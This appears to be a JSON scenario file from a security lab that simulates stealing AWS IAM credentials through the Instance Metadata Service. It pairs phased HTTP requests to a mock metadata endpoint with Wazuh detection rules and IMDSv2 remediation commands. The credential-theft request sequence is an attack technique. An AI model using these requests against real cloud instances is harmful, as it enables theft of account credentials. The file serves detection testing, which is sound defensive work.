{
  "id": "S2-01",
  "name": "IMDS Credential Theft",
  "category": "Cloud Service Accounts",
  "version": "1.0",
  "description": "Steal IAM role credentials via AWS Instance Metadata Service (IMDS)",
  "difficulty": "Medium",
  "real_world_relevance": "Capital One breach (2019), numerous SSRF-to-IMDS attacks",

  "mitre_attack": {
    "tactics": ["Credential Access", "Discovery"],
    "techniques": [
      {"id": "T1552.005", "name": "Unsecured Credentials: Cloud Instance Metadata API"},
      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"}
    ]
  },

  "prerequisites": {
    "containers": ["cloud-workload", "mock-imds"],
    "network": "cloud_net"
  },

  "attack_flow": {
    "description": "Attacker exploits SSRF vulnerability to query IMDS and steal IAM credentials",
    "diagram": [
      "1. Attacker finds SSRF vulnerability in application",
      "2. Attacker queries http://169.254.169.254/latest/meta-data/",
      "3. Attacker enumerates IAM roles via /iam/security-credentials/",
      "4. Attacker retrieves credentials for discovered role",
      "5. Attacker exfiltrates and uses credentials from external system"
    ]
  },

  "phases": [
    {
      "name": "IMDS Discovery",
      "description": "Check if IMDS is accessible",
      "actions": [
        {
          "type": "http_request",
          "target": "http://172.41.0.100:1338/latest/meta-data/",
          "method": "GET",
          "expected_status": 200
        }
      ]
    },
    {
      "name": "Metadata Enumeration",
      "description": "Gather instance information",
      "actions": [
        {
          "type": "http_request",
          "target": "http://172.41.0.100:1338/latest/meta-data/instance-id",
          "method": "GET"
        },
        {
          "type": "http_request",
          "target": "http://172.41.0.100:1338/latest/meta-data/instance-type",
          "method": "GET"
        }
      ]
    },
    {
      "name": "IAM Role Enumeration",
      "description": "List available IAM roles",
      "actions": [
        {
          "type": "http_request",
          "target": "http://172.41.0.100:1338/latest/meta-data/iam/security-credentials/",
          "method": "GET",
          "expected_response_contains": "demo-ec2-instance-role"
        }
      ]
    },
    {
      "name": "Credential Theft",
      "description": "Retrieve IAM role credentials",
      "critical": true,
      "actions": [
        {
          "type": "http_request",
          "target": "http://172.41.0.100:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role",
          "method": "GET",
          "expected_response_contains": ["AccessKeyId", "SecretAccessKey", "Token"]
        }
      ]
    }
  ],

  "indicators_of_compromise": [
    {
      "type": "Network",
      "description": "HTTP request to 169.254.169.254 from application",
      "wazuh_rule": "100650"
    },
    {
      "type": "Network",
      "description": "Request to /iam/security-credentials/ endpoint",
      "wazuh_rule": "100651"
    },
    {
      "type": "CloudTrail",
      "description": "API calls from unusual source IP using instance role credentials",
      "wazuh_rule": "N/A - requires CloudTrail integration"
    }
  ],

  "expected_wazuh_alerts": [
    {
      "rule_id": "100650",
      "level": 8,
      "description": "NHI: AWS Instance Metadata Service (IMDS) access detected"
    },
    {
      "rule_id": "100651",
      "level": 12,
      "description": "NHI: AWS IMDS IAM credential request - CREDENTIAL THEFT ATTEMPT"
    }
  ],

  "remediation": {
    "immediate": [
      "Rotate compromised credentials immediately",
      "Review CloudTrail for unauthorized API activity",
      "Block access from suspicious source IPs"
    ],
    "long_term": [
      "Enforce IMDSv2 (require token for metadata access)",
      "Implement network policies to restrict IMDS access",
      "Use IAM roles with least privilege",
      "Enable credential reporting and alerting"
    ],
    "aws_cli_commands": [
      "# Enforce IMDSv2 on existing instances",
      "aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required --http-endpoint enabled",
      "",
      "# For new instances via launch template",
      "aws ec2 create-launch-template --launch-template-name secure-template --launch-template-data '{\"MetadataOptions\":{\"HttpTokens\":\"required\"}}'"
    ]
  },

  "demo_script": {
    "container": "cloud-workload",
    "command": "/opt/nhi-demo/scripts/simulate-imds-attack.sh"
  },

  "references": [
    {
      "title": "AWS IMDS Documentation",
      "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"
    },
    {
      "title": "Capital One Data Breach Analysis",
      "url": "https://krebsonsecurity.com/tag/capital-one-breach/"
    },
    {
      "title": "MITRE ATT&CK T1552.005",
      "url": "https://attack.mitre.org/techniques/T1552/005/"
    }
  ]
}
